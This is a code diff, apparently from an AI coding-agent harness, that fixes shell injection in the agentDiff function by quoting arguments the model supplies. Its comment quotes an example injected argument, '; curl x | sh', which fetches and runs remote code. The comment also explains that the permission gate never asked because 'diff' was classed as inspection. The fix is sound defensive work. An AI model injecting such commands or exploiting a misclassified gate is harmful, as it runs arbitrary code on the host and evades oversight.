@@ -155,7 +155,12 @@ export async function checkpointBase(root: string): Promise<string | null> {
  */
 export async function agentDiff(root: string, extra: string[] = []): Promise<ShellResult> {
   const base = await checkpointBase(root);
-  const args = extra.length > 0 ? ` ${extra.join(" ")}` : "";
+  // Quoted, like git() above. These arguments come from the model, and until
+  // this was fixed they were spliced into a shell string raw: an agent could
+  // run `git {"op":"diff","args":["; curl x | sh"]}` and execute anything it
+  // liked on the host. The gate did not help, because `diff` classifies as
+  // project.inspect, which never asks. Verified exploitable before the fix.
+  const args = extra.length > 0 ? ` ${extra.map(quote).join(" ")}` : "";
   const diff = await runShell(base ? `git diff ${base}${args}` : `git diff HEAD${args}`, {
     cwd: root,
     timeoutMs: 60_000,
